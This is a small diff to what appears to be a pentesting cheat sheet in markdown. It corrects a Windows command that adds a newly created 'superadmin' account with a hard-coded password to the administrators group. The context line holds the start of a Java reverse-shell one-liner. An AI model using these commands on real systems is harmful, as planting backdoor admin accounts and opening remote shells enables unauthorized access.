@@ -413,7 +413,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 	
 ##### Windows add an Admin user from CMD
 > 1. net user /add [username] [password] ---> ```net user /add superadmin Superadmin123$```
-> 1. net localgroup administrators [username] /add ---> ```net localgroup administrators superadmin```
+> 1. net localgroup administrators [username] /add ---> ```net localgroup administrators /add superadmin```
 
 
 ##### Windows Firewall from CMD
